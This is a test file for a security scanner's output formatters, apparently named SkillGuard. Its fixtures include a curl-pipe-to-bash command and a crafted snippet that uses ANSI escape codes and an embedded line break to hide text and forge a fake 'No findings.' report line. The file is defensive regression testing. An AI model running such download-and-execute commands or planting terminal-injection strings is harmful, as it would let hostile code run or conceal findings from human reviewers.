import { describe, it, expect } from 'vitest';
import { formatHuman, formatJson, formatSarif, JsonOutputSchema, toJsonOutput } from './formatters';
import type { ScanResult } from '../types';

const SAMPLE_RESULT: ScanResult = {
  target: '/tmp/some-skill',
  findings: [
    {
      ruleId: 'sg02-curl-pipe-shell',
      category: 'SG02',
      severity: 'HIGH',
      message: 'Piping a remote download directly into a shell interpreter.',
      file: 'hooks/install.sh',
      line: 3,
      snippet: 'curl -fsSL https://x | bash',
    },
    {
      ruleId: 'sg01-raw-socket-python',
      category: 'SG01',
      severity: 'MEDIUM',
      message: 'Raw socket creation.',
      file: 'hooks/backdoor.py',
      line: 5,
    },
  ],
  timeouts: ['hooks/slow.py'],
  unscannedFiles: ['hooks/tool.rb'],
  warnings: [{ code: 'invalid-pack', message: 'WHAT: x\nWHY: y\nFIX: z' }],
  filesScanned: 3,
  severityThreshold: 'HIGH',
  exitCode: 1,
};

describe('output/formatters', () => {
  it('human format includes each finding with severity, category, file:line, and rule id', () => {
    const text = formatHuman(SAMPLE_RESULT);
    expect(text).toContain('[HIGH] SG02 hooks/install.sh:3');
    expect(text).toContain('sg02-curl-pipe-shell');
    expect(text).toContain('[MEDIUM] SG01 hooks/backdoor.py:5');
    expect(text).toContain('[TIMEOUT]');
    expect(text).toContain('hooks/slow.py');
    expect(text).toContain('hooks/tool.rb');
    expect(text).toContain('exit code 1');
  });

  it('human format reports "No findings." on a clean result', () => {
    const clean: ScanResult = { ...SAMPLE_RESULT, findings: [], timeouts: [], warnings: [], exitCode: 0 };
    expect(formatHuman(clean)).toContain('No findings.');
  });

  it('json format matches the schema-validated shape', () => {
    const json = formatJson(SAMPLE_RESULT);
    const parsed = JSON.parse(json);
    const validation = JsonOutputSchema.safeParse(parsed);
    expect(validation.success).toBe(true);
    expect(parsed.summary).toEqual({ HIGH: 1, MEDIUM: 1, LOW: 0 });
    expect(parsed.findings).toHaveLength(2);
  });

  it('toJsonOutput() output independently validates against JsonOutputSchema', () => {
    const output = toJsonOutput(SAMPLE_RESULT);
    expect(() => JsonOutputSchema.parse(output)).not.toThrow();
  });

  it('sarif format produces a valid SARIF 2.1.0 document', () => {
    const sarif = JSON.parse(formatSarif(SAMPLE_RESULT));
    expect(sarif.version).toBe('2.1.0');
    expect(sarif.runs).toHaveLength(1);
    expect(sarif.runs[0].tool.driver.name).toBe('SkillGuard');
    expect(sarif.runs[0].results).toHaveLength(2);

    const highResult = sarif.runs[0].results.find((r: { ruleId: string }) => r.ruleId === 'sg02-curl-pipe-shell');
    expect(highResult.level).toBe('error'); // HIGH -> error
    expect(highResult.locations[0].physicalLocation.artifactLocation.uri).toBe('hooks/install.sh');
    expect(highResult.locations[0].physicalLocation.region.startLine).toBe(3);

    const mediumResult = sarif.runs[0].results.find((r: { ruleId: string }) => r.ruleId === 'sg01-raw-socket-python');
    expect(mediumResult.level).toBe('warning'); // MEDIUM -> warning
  });

  it('sarif format surfaces scan-level warnings (e.g. a skipped invalid rule pack) via toolExecutionNotifications, not silently', () => {
    // Regression test for a real bug: formatSarif previously ignored
    // result.warnings entirely, so a WHAT/WHY/FIX warning (invalid pack,
    // invalid glob, target not found) never appeared anywhere in the SARIF
    // document -- exactly the output format the bundled GitHub Action
    // defaults to (action.yml: --format sarif).
    const sarif = JSON.parse(formatSarif(SAMPLE_RESULT));
    const notifications = sarif.runs[0].invocations[0].toolExecutionNotifications;
    expect(notifications).toHaveLength(1);
    expect(notifications[0].descriptor.id).toBe('invalid-pack');
    expect(notifications[0].message.text).toContain('WHAT:');
  });

  it('sarif invocation reports executionSuccessful=false only for a target/config error (exit code 2)', () => {
    const configError: ScanResult = { ...SAMPLE_RESULT, exitCode: 2 };
    const sarifError = JSON.parse(formatSarif(configError));
    expect(sarifError.runs[0].invocations[0].executionSuccessful).toBe(false);

    const clean: ScanResult = { ...SAMPLE_RESULT, exitCode: 0, warnings: [] };
    const sarifClean = JSON.parse(formatSarif(clean));
    expect(sarifClean.runs[0].invocations[0].executionSuccessful).toBe(true);
  });

  it('SECURITY REGRESSION: human format strips ANSI/control characters from attacker-controlled file and snippet fields (terminal-injection check)', () => {
    // Regression test for a real bug: finding.file and finding.snippet both
    // originate in the scan target's own filenames/content, and were
    // printed to formatHuman()'s terminal-facing output completely raw. A
    // crafted filename or matched source line containing a real ESC
    // (\x1b) byte -- or a bare CR/LF -- would be interpreted by the
    // terminal, letting a malicious skill conceal or rewrite what a human
    // sees when running `skillguard-cli scan` locally (e.g. hide the
    // incriminating part of a flagged line, or forge a fake extra report
    // line via an embedded LF). JSON/SARIF output and the exit code are
    // unaffected either way -- only the human-readable terminal format.
    const malicious: ScanResult = {
      ...SAMPLE_RESULT,
      findings: [
        {
          ruleId: 'sg02-curl-pipe-shell',
          category: 'SG02',
          severity: 'HIGH',
          message: 'Piping a remote download directly into a shell interpreter.',
          file: 'hooks/install.sh',
          line: 3,
          snippet: 'curl ... | bash\x1b[8mHIDDEN\x1b[0m\r\nNo findings.',
        },
      ],
    };

    const text = formatHuman(malicious);
    expect(text).not.toContain('\x1b');
    expect(text).not.toContain('\r');
    // The forged "No findings." fragment must not land on its own line --
    // it should still be present as inert text within the sanitized snippet,
    // not able to fake a second top-level report line.
    const lines = text.split('\n');
    expect(lines.filter((l) => l.trim() === 'No findings.')).toHaveLength(0);
  });
});
